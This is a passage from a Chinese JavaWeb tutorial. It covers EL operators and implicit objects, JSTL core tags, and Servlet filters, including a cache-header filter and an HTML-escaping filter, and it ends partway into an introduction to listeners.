Transitional//EN">\n<html>\n\t<head>\n\t\t<title>EL两个特殊的运算符</title>\n\t</head>\n\t<body>\n\t\t<%--empty运算符：\n\t\t\t它会判断：对象是否为null，字符串是否为空字符串，集合中元素是否是0个\n\t\t--%>\n\t\t<% String str = null;\n\t\t  String str1 = "";\n\t\t  List<String> slist = new ArrayList<String>();\n\t\t  pageContext.setAttribute("str", str);\n\t\t  pageContext.setAttribute("str1", str1);\n\t\t  pageContext.setAttribute("slist", slist);\n\t\t%>\n\t\t${empty str}============当对象为null返回true<br/>\n\t\t${empty str1 }==========当字符串为空字符串是返回true(注意：它不会调用trim()方法)<br>\n\t\t${empty slist}==========当集合中的元素是0个时，是true\n\t\t<hr/>\n\t\t<%--三元运算符 \n\t\t\t 条件?真:假\n\t\t--%>\n\t\t<% request.setAttribute("gender", "female"); %>\n\t\t<input type="radio" name="gender" value="male" ${gender eq "male"?"checked":""} >男\n\t\t<input type="radio" name="gender" value="female" ${gender eq "female"?"checked":""}>女\n\t</body>\n</html>\n```\n\n运行结果图：\n\n![eldemo4](./img/java/javaweb/EL&Filter&Listener-授课.assets/eldemo4.png)\n\n### 1.1.3 EL表达式的11个隐式对象\n\n#### 1）隐式对象介绍\n\nEL表达式也为我们提供隐式对象，可以让我们不声明直接来使用，十一个对象见下表，需要注意的是，它和JSP的隐式对象不是一回事：\n\n| EL中的隐式对象   | 类型                          | 对应JSP隐式对象 | 备注                                    |\n| ---------------- | ----------------------------- | --------------- | --------------------------------------- |\n| PageContext      | Javax.serlvet.jsp.PageContext | PageContext     | 完全一样                                |\n| ApplicationScope | Java.util.Map                 | 没有            | 应用层范围                              |\n| SessionScope     | Java.util.Map                 | 没有            | 会话范围                                |\n| RequestScope     | Java.util.Map                 | 没有            | 请求范围                                |\n| PageScope        | Java.util.Map                 | 没有            | 页面层范围                              |\n| Header           | Java.util.Map                 | 没有            | 请求消息头key，值是value（一个）        |\n| HeaderValues     | Java.util.Map                 | 没有            | 请求消息头key，值是数组（一个头多个值） |\n| Param            | Java.util.Map                 | 没有            | 请求参数key，值是value（一个）          |\n| ParamValues      | Java.util.Map                 | 没有            | 请求参数key，值是数组（一个名称多个值） |\n| InitParam        | Java.util.Map                 | 没有            | 全局参数，key是参数名称，value是参数值  |\n| Cookie           | Java.util.Map                 | 没有            | Key是cookie的名称，value是cookie对象    |\n\n## 1.2 JSTL\n\n### 1.2.1 JSTL概述\n\n#### 1）简介\n\nJSTL的全称是：JSP Standard Tag Libary。它是JSP中标准的标签库。它是由Apache实现的。\n\n它由以下5个部分组成：\n\n| 组成      | 作用         | 说明                           |\n| --------- | ------------ | ------------------------------ |\n| Core      | 核心标签库。 | 通用逻辑处理                   |\n| Fmt       | 国际化有关。 | 需要不同地域显示不同语言时使用 |\n| Functions | EL函数       | EL表达式可以使用的方法         |\n| SQL       | 操作数据库。 | 不用                           |\n| XML       | 操作XML。    | 不用                           |\n\n#### 2）使用要求\n\n要想使用JSTL标签库，在javaweb工程中需要导入坐标。首先是在工程的WEB-INF目录中创建一个lib目录，接下来把jstl的jar拷贝到lib目录中，最后在jar包上点击右键，然后选择【Add as Libary】添加。如下图所示：\n\n![jstl的jar包](./img/java/javaweb/EL&Filter&Listener-授课.assets/jstl的jar包.png)\n\n### 1.2.2 核心标签库\n\n在我们实际开发中，用到的jstl标签库主要以核心标签库为准，偶尔会用到国际化标签库的标签。下表中把我们经常可能用到的标签列在此处，其余标签库请同学们参考【JSTL标签库.doc】文档。\n\n| 标签名称                             | 功能分类 | 分类       | 作用             |\n| ------------------------------------ | -------- | ---------- | ---------------- |\n| `<c:if>`                             | 流程控制 | 核心标签库 | 用于判断         |\n| `<c:choose> ,<c:when>,<c:otherwise>` | 流程控制 | 核心标签库 | 用于多个条件判断 |\n| `<c:foreache>`                       | 迭代操作 | 核心标签库 | 用于循环遍历     |\n\n### 1.2.3 JSTL使用\n\n```jsp\n<%@ page language="java" import="java.util.*" pageEncoding="UTF-8"%>\n<%--导入jstl标签库 --%>\n<%@ taglib uri="http://java.sun.com/jsp/jstl/core" prefix="c" %>\n<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">\n<html>\n  <head>\n    <title>JSTL的常用标签</title>\n  </head>\n  <body>\n    <%-- c:if  c:choose   c:when c:otherwise --%>\n    <% pageContext.setAttribute("score","F"); %>\n    <c:if test="${pageScope.score eq \'A\' }">\n    \t优秀\n    </c:if>\n    <c:if\ttest="${pageScope.score eq \'C\' }">\n    \t一般\n    </c:if>\n    <hr/>\n    <c:choose>\n    \t<c:when test="${pageScope.score eq \'A\' }">\n    \t\tAAA\n    \t</c:when>\n    \t<c:when test="${pageScope.score eq \'B\' }">BBB\n    \t</c:when>\n    \t<c:when test="${pageScope.score eq \'C\' }">CCC\n    \t</c:when>\n    \t<c:when test="${pageScope.score eq \'D\' }">DDD\n    \t</c:when>\n    \t<c:otherwise>其他</c:otherwise>\n    </c:choose>\n    \n    <%-- c:forEach 它是用来遍历集合的\n    \t 属性：\n    \t \titems：要遍历的集合，它可以是EL表达式取出来的\n    \t \tvar：把当前遍历的元素放入指定的page域中。 var的取值就是key,当前遍历的元素就是value\n    \t \t\t注意：它不能支持EL表达式，只能是字符串常量\n    \t \tbegin:开始遍历的索引\n    \t \tend:结束遍历的索引\n    \t \tstep：步长。i+=step\n    \t \tvarStatus：它是一个计数器对象。里面有两个属性，一个是用于记录索引。一个是用于计数。\n    \t \t\t\t   索引是从0开始。计数是从1开始\n    --%>\n    <hr/>\n    <% List<String> list = new ArrayList<String>();\n       list.add("AAA");\n       list.add("BBB");\n       list.add("CCC");\n       list.add("DDD");\n       list.add("EEE");\n       list.add("FFF");\n       list.add("GGG");\n       list.add("HHH");\n       list.add("III");\n       list.add("JJJ");\n       list.add("KKK");\n       list.add("LLL");\n       pageContext.setAttribute("list",list);\n     %>\n\t<c:forEach items="${list}" var="s" begin="1" end="7" step="2">\n    \t${s}<br/>\n    </c:forEach>\n    <hr/>\n    <c:forEach begin="1" end="9" var="num">\n    \t<a href="#">${num}</a>\n    </c:forEach>\n    <hr/>\n    <table>\n    \t<tr>\n    \t\t<td>索引</td>\n    \t\t<td>序号</td>\n    \t\t<td>信息</td>\n    \t</tr>\n    <c:forEach items="${list}" var="s" varStatus="vs">\n    \t<tr>\n    \t\t<td>${vs.index}</td>\n    \t\t<td>${vs.count}</td>\n    \t\t<td>${s}</td>\n    \t</tr>\n    </c:forEach>\n    </table>\n  </body>\n</html>\n```\n\n# 2 Servlet规范中的过滤器-Filter\n\n## 2.1 过滤器入门\n\n### 2.1.1 过滤器概念及作用\n\n过滤器——Filter，它是JavaWeb三大组件之一。另外两个是Servlet和Listener。\n\n它是在2000年发布的Servlet2.3规范中加入的一个接口。是Servlet规范中非常实用的技术。\n\n它可以对web应用中的所有资源进行拦截，并且在拦截之后进行一些特殊的操作。\n\n常见应用场景：URL级别的权限控制；过滤敏感词汇；中文乱码问题等等。\n\n### 2.1.2 过滤器的入门案例\n\n#### 1）前期准备\n\n**创建JavaWeb工程**\n\n![filter_demo1](./img/java/javaweb/EL&Filter&Listener-授课.assets/filter_demo1.png)\n\n**编写和配置接收请求用的Servlet**\n\n```java\n/**\n * 用于接收和处理请求的Servlet\n * @author 黑马程序员\n * @Company http://www.itheima.com\n */\npublic class ServletDemo1 extends HttpServlet {\n\n    /**\n     * 处理请求的方法\n     * @param req\n     * @param resp\n     * @throws ServletException\n     * @throws IOException\n     */\n    @Override\n    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {\n        System.out.println("ServletDemo1接收到了请求");\n        req.getRequestDispatcher("/WEB-INF/pages/success.jsp").forward(req,resp);\n    }\n\n    @Override\n    protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {\n       doGet(req,resp);\n    }\n}\n```\n\n```xml\n<?xml version="1.0" encoding="UTF-8"?>\n<web-app xmlns="http://xmlns.jcp.org/xml/ns/javaee"\n         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"\n         xsi:schemaLocation="http://xmlns.jcp.org/xml/ns/javaee\n                      http://xmlns.jcp.org/xml/ns/javaee/web-app_3_1.xsd"\n         version="3.1"\n         metadata-complete="true">\n    \n    \x3c!--配置Servlet--\x3e\n    <servlet>\n        <servlet-name>ServletDemo1</servlet-name>\n        <servlet-class>com.itheima.web.servlet.ServletDemo1</servlet-class>\n    </servlet>\n    <servlet-mapping>\n        <servlet-name>ServletDemo1</servlet-name>\n        <url-pattern>/ServletDemo1</url-pattern>\n    </servlet-mapping>\n</web-app>\n\n```\n\n**编写index.jsp**\n\n```jsp\n<%-- Created by IntelliJ IDEA. --%>\n<%@ page contentType="text/html;charset=UTF-8" language="java" %>\n<html>\n  <head>\n    <title>主页面</title>\n  </head>\n  <body>\n    <a href="${pageContext.request.contextPath}/ServletDemo1">访问ServletDemo1</a>\n  </body>\n</html>\n```\n\n**编写success.jsp**\n\n```jsp\n<%@ page contentType="text/html;charset=UTF-8" language="java" %>\n<html>\n<head>\n    <title>成功页面</title>\n</head>\n<body>\n<%System.out.println("success.jsp执行了");%>\n执行成功！\n</body>\n</html>\n\n```\n\n![filter_demo2](./img/java/javaweb/EL&Filter&Listener-授课.assets/filter_demo2.png)\n\n#### 2）过滤器的编写步骤\n\n**编写过滤器**\n\n```java\n/**\n * Filter的入门案例\n * @author 黑马程序员\n * @Company http://www.itheima.com\n */\npublic class FilterDemo1 implements Filter {\n\n    /**\n     * 过滤器的核心方法\n     * @param request\n     * @param response\n     * @param chain\n     * @throws IOException\n     * @throws ServletException\n     */\n    @Override\n    public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws IOException, ServletException {\n        /**\n         * 如果不写此段代码，控制台会输出两次：FilterDemo1拦截到了请求。\n         */\n        HttpServletRequest req = (HttpServletRequest) request;\n        String requestURI = req.getRequestURI();\n        if (requestURI.contains("favicon.ico")) {\n            return;\n        }\n        System.out.println("FilterDemo1拦截到了请求");\n    }\n}\n```\n\n**配置过滤器**\n\n```xml\n\x3c!--配置过滤器--\x3e\n<filter>\n    <filter-name>FilterDemo1</filter-name>\n    <filter-class>com.itheima.web.filter.FilterDemo1</filter-class>\n</filter>\n<filter-mapping>\n    <filter-name>FilterDemo1</filter-name>\n    <url-pattern>/*</url-pattern>\n</filter-mapping>\n```\n\n#### 3）测试部署\n\n**部署项目**\n\n![filter_demo3](./img/java/javaweb/EL&Filter&Listener-授课.assets/filter_demo3.png)\n\n**测试结果**\n\n![filter_demo4](./img/java/javaweb/EL&Filter&Listener-授课.assets/filter_demo4.png)\n\n**案例的问题分析及解决**\n\n当我们启动服务，在地址栏输入访问地址后，发现浏览器任何内容都没有，控制台却输出了【FilterDemo1拦截到了请求】，也就是说在访问任何资源的时候，都先经过了过滤器。\n\n这是因为：我们在配置过滤器的拦截规则时，使用了<font color=\'red\' size="5"><b>/*</b></font>,表明访问当前应用下任何资源，此过滤器都会起作用。除了这种全部过滤的规则之外，它还支持特定类型的过滤配置。我们可以稍作调整，就可以不用加上面那段过滤图标的代码了。修改的方式如下：\n\n![filter_demo6](./img/java/javaweb/EL&Filter&Listener-授课.assets/filter_demo6.png)\n\n现在的问题是，我们拦截下来了，点击链接发送请求，运行结果是：\n\n![filter_demo7](./img/java/javaweb/EL&Filter&Listener-授课.assets/filter_demo7.png)\n\n需要对过滤器执行放行操作，才能让他继续执行，那么如何放行的？\n\n我们需要使用`FilterChain`中的`doFilter`方法放行。\n\n![1577953319367](./img/java/javaweb/EL&Filter&Listener-授课.assets/filter_demo5.png)\n\n## 2.2 过滤器的细节\n\n### 2.2.1 过滤器API介绍\n\n#### 1）Filter\n\n![Filter_API](./img/java/javaweb/EL&Filter&Listener-授课.assets/Filter_API.png)\n\n![Filter_API2](./img/java/javaweb/EL&Filter&Listener-授课.assets/Filter_API2.png)\n\n#### 2）FilterConfig\n\n![FilterConfig_API](./img/java/javaweb/EL&Filter&Listener-授课.assets/FilterConfig_API.png)\n\n#### 3）FilterChain\n\n![FilterChain_API](./img/java/javaweb/EL&Filter&Listener-授课.assets/FilterChain_API.png)\n\n### 2.2.2 入门案例过程及生命周期\n\n#### 1）生命周期\n\n**出生——活着——死亡**\n\n**出生：**当应用加载的时候执行实例化和初始化方法。\n\n**活着：**只要应用一直提供服务，对象就一直存在。\n\n**死亡：**当应用卸载时，或者服务器宕机时，对象消亡。\n\n**Filter的实例对象在内存中也只有一份。所以也是单例的。**\n\n#### 2）过滤器核心方法的细节\n\n在`FilterDemo1`的`doFilter`方法添加一行代码，如下：\n\n```java\n/**\n     * 过滤器的核心方法\n     * @param request\n     * @param response\n     * @param chain\n     * @throws IOException\n     * @throws ServletException\n     */\n    @Override\n    public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws IOException, ServletException {\n        /**\n         * 如果不写此段代码，控制台会输出两次：FilterDemo1拦截到了请求。\n\n        HttpServletRequest req = (HttpServletRequest) request;\n        String requestURI = req.getRequestURI();\n        if (requestURI.contains("favicon.ico")) {\n            return;\n        }*/\n        System.out.println("FilterDemo1拦截到了请求");\n        //过滤器放行\n        chain.doFilter(request,response);\n        System.out.println("FilterDemo1放行之后，又回到了doFilter方法");\n    }\n```\n\n测试运行结果，我们发现过滤器放行之后执行完目标资源，仍会回到过滤器中：\n\n![filter_demo8](./img/java/javaweb/EL&Filter&Listener-授课.assets/filter_demo8.png)\n\n### 2.2.3 过滤器初始化参数配置\n\n#### 1）创建过滤器FilterDemo2\n\n```java\n/**\n * Filter的初始化参数配置\n * @author 黑马程序员\n * @Company http://www.itheima.com\n */\npublic class FilterDemo2 implements Filter {\n\n    private FilterConfig filterConfig;\n\n    /**\n     * 初始化方法\n     * @param filterConfig\n     * @throws ServletException\n     */\n    @Override\n    public void init(FilterConfig filterConfig) throws ServletException {\n        System.out.println("FilterDemo2的初始化方法执行了");\n        //给过滤器配置对象赋值\n        this.filterConfig = filterConfig;\n    }\n\n    /**\n     * 过滤器的核心方法\n     * @param request\n     * @param response\n     * @param chain\n     * @throws IOException\n     * @throws ServletException\n     */\n    @Override\n    public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws IOException, ServletException {\n\n        System.out.println("FilterDemo2拦截到了请求");\n        //过滤器放行\n        chain.doFilter(request,response);\n    }\n    \n    /**\n     * 销毁方法\n     */\n    @Override\n    public void destroy() {\n        System.out.println("FilterDemo2的销毁方法执行了");\n    }\n}\n```\n\n#### 2）配置FilterDemo2\n\n```xml\n<filter>\n    <filter-name>FilterDemo2</filter-name>\n    <filter-class>com.itheima.web.filter.FilterDemo2</filter-class>\n    \x3c!--配置过滤器的初始化参数--\x3e\n    <init-param>\n        <param-name>filterInitParamName</param-name>\n        <param-value>filterInitParamValue</param-value>\n    </init-param>\n</filter>\n<filter-mapping>\n    <filter-name>FilterDemo2</filter-name>\n    <url-pattern>/ServletDemo1</url-pattern>\n</filter-mapping>\n```\n\n#### 3）在FilterDemo2的doFilter方法中添加下面的代码\n\n```java\n//根据名称获取过滤器的初始化参数\nString paramValue = filterConfig.getInitParameter("filterInitParamName");\nSystem.out.println(paramValue);\n\n//获取过滤器初始化参数名称的枚举\nEnumeration<String> initNames = filterConfig.getInitParameterNames();\nwhile(initNames.hasMoreElements()){\n    String initName = initNames.nextElement();\n    String initValue = filterConfig.getInitParameter(initName);\n    System.out.println(initName+","+initValue);\n}\n\n//获取ServletContext对象\nServletContext servletContext = filterConfig.getServletContext();\nSystem.out.println(servletContext);\n\n//获取过滤器名称\nString filterName = filterConfig.getFilterName();\nSystem.out.println(filterName);\n```\n\n#### 4）测试运行结果\n\n![FilterConfig_demo](./img/java/javaweb/EL&Filter&Listener-授课.assets/FilterConfig_demo.png)\n\n我们通过这个测试，看到了过滤器的初始化参数配置和获取的使用。但是同学们也肯定发现了，在我们的工程中两个过滤器都起作用了，这就是我们在API中说的链式调用，那么当有多个过滤器，它的执行顺序是什么样的呢？\n\n我们来看下一小节。\n\n### 2.2.5 多个过滤器的执行顺序\n\n#### 1）修改FilterDemo1和FilterDemo2两个过滤器的代码，删掉多余的代码\n\n```java\n/**\n * Filter的入门案例\n * @author 黑马程序员\n * @Company http://www.itheima.com\n */\npublic class FilterDemo1 implements Filter {\n    /**\n     * 过滤器的核心方法\n     * @param request\n     * @param response\n     * @param chain\n     * @throws IOException\n     * @throws ServletException\n     */\n    @Override\n    public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws IOException, ServletException {\n        \n        System.out.println("FilterDemo1拦截到了请求");\n        //过滤器放行\n        chain.doFilter(request,response);\n    }\n\n    /**\n     * 初始化方法\n     * @param filterConfig\n     * @throws ServletException\n     */\n    @Override\n    public void init(FilterConfig filterConfig) throws ServletException {\n        System.out.println("FilterDemo1的初始化方法执行了");\n    }\n\n    /**\n     * 销毁方法\n     */\n    @Override\n    public void destroy() {\n        System.out.println("FilterDemo1的销毁方法执行了");\n    }\n}\n```\n\n```java\n/**\n * Filter的初始化参数配置\n * @author 黑马程序员\n * @Company http://www.itheima.com\n */\npublic class FilterDemo2 implements Filter {\n\n    /**\n     * 初始化方法\n     * @param filterConfig\n     * @throws ServletException\n     */\n    @Override\n    public void init(FilterConfig filterConfig) throws ServletException {\n        System.out.println("FilterDemo2的初始化方法执行了");\n\n    }\n\n    /**\n     * 过滤器的核心方法\n     * @param request\n     * @param response\n     * @param chain\n     * @throws IOException\n     * @throws ServletException\n     */\n    @Override\n    public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws IOException, ServletException {\n\n        System.out.println("FilterDemo2拦截到了请求");\n        //过滤器放行\n        chain.doFilter(request,response);\n    }\n\n    /**\n     * 销毁方法\n     */\n    @Override\n    public void destroy() {\n        System.out.println("FilterDemo2的销毁方法执行了");\n    }\n}\n```\n\n#### 2）修改两个过滤器的配置，删掉多余的配置\n\n```xml\n\x3c!--配置过滤器--\x3e\n<filter>\n    <filter-name>FilterDemo1</filter-name>\n    <filter-class>com.itheima.web.filter.FilterDemo1</filter-class>\n</filter>\n<filter-mapping>\n    <filter-name>FilterDemo1</filter-name>\n    <url-pattern>/ServletDemo1</url-pattern>\n</filter-mapping>\n\n\n<filter>\n    <filter-name>FilterDemo2</filter-name>\n    <filter-class>com.itheima.web.filter.FilterDemo2</filter-class>\n</filter>\n<filter-mapping>\n    <filter-name>FilterDemo2</filter-name>\n    <url-pattern>/ServletDemo1</url-pattern>\n</filter-mapping>\n```\n\n#### 3）测试运行结果\n\n![filter_multi_demo](./img/java/javaweb/EL&Filter&Listener-授课.assets/filter_multi_demo.png)\n\n此处我们看到了多个过滤器的执行顺序，它正好和我们在web.xml中的配置顺序一致，如下图：\n\n![filter_execute_order](./img/java/javaweb/EL&Filter&Listener-授课.assets/filter_execute_order.png)\n\n在过滤器的配置中，有过滤器的声明和过滤器的映射两部分，到底是声明决定顺序，还是映射决定顺序呢？\n\n答案是：<font color=\'red\'><b>`<filter-mapping>`的配置前后顺序决定过滤器的调用顺序，也就是由映射配置顺序决定。</b></font>\n\n### 2.2.6 过滤器的五种拦截行为\n\n我们的过滤器目前拦截的是请求，但是在实际开发中，我们还有请求转发和请求包含，以及由服务器触发调用的全局错误页面。默认情况下过滤器是不参与过滤的，要想使用，需要我们配置。配置的方式如下：\n\n```xml\n\x3c!--配置过滤器--\x3e\n<filter>\n    <filter-name>FilterDemo1</filter-name>\n    <filter-class>com.itheima.web.filter.FilterDemo1</filter-class>\n    \x3c!--配置开启异步支持，当dispatcher配置ASYNC时，需要配置此行--\x3e\n    <async-supported>true</async-supported>\n</filter>\n<filter-mapping>\n    <filter-name>FilterDemo1</filter-name>\n    <url-pattern>/ServletDemo1</url-pattern>\n    \x3c!--过滤请求：默认值。--\x3e\n    <dispatcher>REQUEST</dispatcher>\n    \x3c!--过滤全局错误页面：当由服务器调用全局错误页面时，过滤器工作--\x3e\n    <dispatcher>ERROR</dispatcher>\n    \x3c!--过滤请求转发：当请求转发时，过滤器工作。--\x3e\n    <dispatcher>FORWARD</dispatcher>\n    \x3c!--过滤请求包含：当请求包含时，过滤器工作。它只能过滤动态包含，jsp的include指令是静态包含--\x3e\n    <dispatcher>INCLUDE</dispatcher>\n    \x3c!--过滤异步类型，它要求我们在filter标签中配置开启异步支持--\x3e\n    <dispatcher>ASYNC</dispatcher>\n</filter-mapping>\n```\n\n### 2.2.4 过滤器与Servlet的区别\n\n| 方法/类型                                          | Servlet                                                      | Filter                                                       | 备注                                                         |\n| -------------------------------------------------- | ------------------------------------------------------------ | ------------------------------------------------------------ | ------------------------------------------------------------ |\n| 初始化                                        方法 | `void   init(ServletConfig);   `                             | `void init(FilterConfig);   `                                | 几乎一样，都是在web.xml中配置参数，用该对象的方法可以获取到。 |\n| 提供服务方法                                       | `void   service(request,response);                                               ` | `void   dofilter(request,response,FilterChain);                                   ` | Filter比Servlet多了一个FilterChain，它不仅能完成Servlet的功能，而且还可以决定程序是否能继续执行。所以过滤器比Servlet更为强大。   在Struts2中，核心控制器就是一个过滤器。 |\n| 销毁方法                                           | `void destroy();`                                            | `void destroy();`                                            |                                                              |\n\n## 2.3 过滤器的使用案例\n\n### 2.3.1 静态资源设置缓存时间过滤器\n\n#### 1） 需求说明\n\n在我们访问html，js，image时，不需要每次都重新发送请求读取资源，就可以通过设置响应消息头的方式，设置缓存时间。但是如果每个Servlet都编写相同的代码，显然不符合我们统一调用和维护的理念。（此处有个非常重要的编程思想：AOP思想，在录制视频时提不提都可以）\n\n因此，我们要采用过滤器来实现功能。\n\n#### 2） 编写步骤\n\n**第一步：创建JavaWeb工程**\n\n![filter2_demo](./img/java/javaweb/EL&Filter&Listener-授课.assets/filter2_demo.png)\n\n**第二步：导入静态资源**\n\n![filter2_demo_staticresource](./img/java/javaweb/EL&Filter&Listener-授课.assets/filter2_demo_staticresource.png)\n\n**第三步：编写过滤器**\n\n```java\n/**\n * 静态资源设置缓存时间\n * \thtml设置为1小时\n *  js设置为2小时\n *  css设置为3小时\n * @author 黑马程序员\n * @Company http://www.itheima.com\n */\npublic class StaticResourceNeedCacheFilter implements Filter {\n\n    private FilterConfig filterConfig;\n\n    public void init(FilterConfig filterConfig) throws ServletException {\n        this.filterConfig = filterConfig;\n    }\n\n\n    public void doFilter(ServletRequest req, ServletResponse res,\n                         FilterChain chain) throws IOException, ServletException {\n        //1.把doFilter的请求和响应对象转换成跟http协议有关的对象\n        HttpServletRequest  request;\n        HttpServletResponse response;\n        try {\n            request = (HttpServletRequest) req;\n            response = (HttpServletResponse) res;\n        } catch (ClassCastException e) {\n            throw new ServletException("non-HTTP request or response");\n        }\n        //2.获取请求资源URI\n        String uri = request.getRequestURI();\n        //3.得到请求资源到底是什么类型\n        String extend = uri.substring(uri.lastIndexOf(".")+1);//我们只需要判断它是不是html,css,js。其他的不管\n        //4.判断到底是什么类型的资源\n        long time = 60*60*1000;\n        if("html".equals(extend)){\n            //html 缓存1小时\n            String html = filterConfig.getInitParameter("html");\n            time = time*Long.parseLong(html);\n        }else if("js".equals(extend)){\n            //js 缓存2小时\n            String js = filterConfig.getInitParameter("js");\n            time = time*Long.parseLong(js);\n        }else if("css".equals(extend)){\n            //css 缓存3小时\n            String css = filterConfig.getInitParameter("css");\n            time = time*Long.parseLong(css);\n\n        }\n        //5.设置响应消息头\n        response.setDateHeader("Expires", System.currentTimeMillis()+time);\n        //6.放行\n        chain.doFilter(request, response);\n    }\n\n\n    public void destroy() {\n\n    }\n\n}\n```\n\n**第四步：配置过滤器**\n\n```xml\n<filter>\n    <filter-name>StaticResourceNeedCacheFilter</filter-name>\n    <filter-class>com.itheima.web.filter.StaticResourceNeedCacheFilter</filter-class>\n    <init-param>\n        <param-name>html</param-name>\n        <param-value>3</param-value>\n    </init-param>\n    <init-param>\n        <param-name>js</param-name>\n        <param-value>4</param-value>\n    </init-param>\n    <init-param>\n        <param-name>css</param-name>\n        <param-value>5</param-value>\n    </init-param>\n</filter>\n<filter-mapping>\n    <filter-name>StaticResourceNeedCacheFilter</filter-name>\n    <url-pattern>*.html</url-pattern>\n</filter-mapping>\n<filter-mapping>\n    <filter-name>StaticResourceNeedCacheFilter</filter-name>\n    <url-pattern>*.js</url-pattern>\n</filter-mapping>\n<filter-mapping>\n    <filter-name>StaticResourceNeedCacheFilter</filter-name>\n    <url-pattern>*.css</url-pattern>\n</filter-mapping>\n```\n\n#### 3） 测试结果\n\n> 此案例演示时需要注意一下，chrome浏览器刷新时，每次也都会发送请求，所以看不到304状态码。建议用IE浏览器，因为它在刷新时不会再次请求。\n\n![staticresource_demo](./img/java/javaweb/EL&Filter&Listener-授课.assets/staticresource_demo.png)\n\n### 2.3.2 特殊字符过滤器\n\n#### 1）需求说明\n\n在实际开发中，可能会面临一个问题，就是很多输入框都会遇到特殊字符。此时，我们也可以通过过滤器来解决。\n\n例如：\n\n​\t我们模拟一个论坛，有人发帖问：“在HTML中表示水平线的标签是哪个？”。\n\n如果我们在文本框中直接输入`<hr/>`就会出现一条水平线，这个会让发帖人一脸懵。\n\n我们接下来就用过滤器来解决一下。\n\n#### 2）编写步骤\n\n**第一步：创建JavaWeb工程**\n\n沿用第一个案例的工程\n\n**第二步：编写Servlet和JSP**\n\n```java\n/**\n * @author 黑马程序员\n * @Company http://www.itheima.com\n */\npublic class ServletDemo1 extends HttpServlet {\n\n    public void doGet(HttpServletRequest request, HttpServletResponse response)\n            throws ServletException, IOException {\n        String content = request.getParameter("content");\n        response.getWriter().write(content);\n    }\n\n    public void doPost(HttpServletRequest request, HttpServletResponse response)\n            throws ServletException, IOException {\n        doGet(request, response);\n    }\n\n}\n```\n\n```jsp\n<servlet>\n    <servlet-name>ServletDemo1</servlet-name>\n    <servlet-class>com.itheima.web.servlet.ServletDemo1</servlet-class>\n</servlet>\n<servlet-mapping>\n    <servlet-name>ServletDemo1</servlet-name>\n    <url-pattern>/ServletDemo1</url-pattern>\n</servlet-mapping>\n```\n\n```jsp\n<%@ page language="java" import="java.util.*" pageEncoding="UTF-8"%>\n<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">\n<html>\n<head>\n    <title></title>\n</head>\n<body>\n<form action="${pageContext.request.contextPath}/ServletDemo1" method="POST">\n    回帖：<textarea rows="5" cols="25" name="content"></textarea><br/>\n    <input type="submit" value="发言">\n</form>\n</body>\n</html>\n```\n\n**第三步：编写过滤器**\n\n```java\n\n/**\n * @author 黑马程序员\n * @Company http://www.itheima.com\n */\npublic class HTMLFilter implements Filter {\n\n    public void init(FilterConfig filterConfig) throws ServletException {\n\n    }\n\n\n    public void doFilter(ServletRequest req, ServletResponse res,\n                         FilterChain chain) throws IOException, ServletException {\n        HttpServletRequest request;\n        HttpServletResponse response;\n        try {\n            request = (HttpServletRequest) req;\n            response = (HttpServletResponse) res;\n        } catch (ClassCastException e) {\n            throw new ServletException("non-HTTP request or response");\n        }\n        //创建一个自己的Request类\n        MyHttpServletRequest2 myrequest = new MyHttpServletRequest2(request);\n        //放行：\n        chain.doFilter(myrequest, response);\n    }\n\n    public void destroy() {\n    }\n}\nclass MyHttpServletRequest2 extends HttpServletRequestWrapper {\n    //提供一个构造方法\n    public MyHttpServletRequest2(HttpServletRequest request){\n        super(request);\n    }\n\n    //重写getParameter方法\n    public String getParameter(String name) {\n        //1.获取出请求正文： 调用父类的获取方法\n        String value = super.getParameter(name);\n        //2.判断value是否有值\n        if(value == null){\n            return null;\n        }\n        return htmlfilter(value);\n    }\n\n    private String htmlfilter(String message){\n        if (message == null)\n            return (null);\n\n        char content[] = new char[message.length()];\n        message.getChars(0, message.length(), content, 0);\n        StringBuilder result = new StringBuilder(content.length + 50);\n        for (int i = 0; i < content.length; i++) {\n            switch (content[i]) {\n                case \'<\':\n                    result.append("&lt;");\n                    break;\n                case \'>\':\n                    result.append("&gt;");\n                    break;\n                case \'&\':\n                    result.append("&amp;");\n                    break;\n                case \'"\':\n                    result.append("&quot;");\n                    break;\n                default:\n                    result.append(content[i]);\n            }\n        }\n        return (result.toString());\n    }\n\n}\n```\n\n**第四步：配置过滤器**\n\n```xml\n<filter>\n    <filter-name>HTMLFilter</filter-name>\n    <filter-class>com.itheima.web.filter.HTMLFilter</filter-class>\n</filter>\n<filter-mapping>\n    <filter-name>HTMLFilter</filter-name>\n    <url-pattern>/*</url-pattern>\n</filter-mapping>\n```\n\n#### 3）测试结果\n\n![HTMLFilter_demo](./img/java/javaweb/EL&Filter&Listener-授课.assets/HTMLFilter_demo.png)\n\n# 3 Servlet规范中的监听器-Listener\n\n## 3.1 观察者设计模式\n\n在介绍监听器之前，先跟同学们普及一个知识，观察者设计模式。因为所有的监听器都是观察者设计模式的体现。\n\n那什么是观察者设计模式呢？\n\n它是事件驱动的一种体现形式。就好比在做什么事情的时候被人盯着。当对应做到某件事时，触发事件。\n\n观察者模式通常由以下三部分组成：\n\n​            事件源：触发事件的对象。\n\n​\t\t\t事件：触发的动作，里面封装了事件源。\n\n​\t\t\t监听器：当事件源触发事件时，要做的事情。一般是一个接口，由使用者来实现。（此处的思想还涉及了一个涉及模式，我们在JDBC的第二天课程中就给同学们讲解，策略模式）\n\n下图描述了观察者设计模式组成：\n\n![观察者模式](./img/java/javaweb/EL&Filter&Listener-授课.assets/观察者模式.jpg)\n\n## 3.1 Servlet规范中的8个监听器简介\n\n### 3.1.1 监听对象创建的\n\n#### 1）ServletContextListener\n\n```java\n/**\n * 用于监听ServletContext对象创建和销毁的监听器\n * @since v 2.3\n */\n\npublic interface ServletContextListener extends EventListener {\n\n    /**\n     *\t对象创建时执行此方法。该方法的参数是ServletContextEvent事件对象，事件是【创建对象】这个动作\n     *  事件对象中封装着触发事件的来源，即事件源，就是ServletContext\n     */\n    public default void contextInitialized(ServletContextEvent sce) 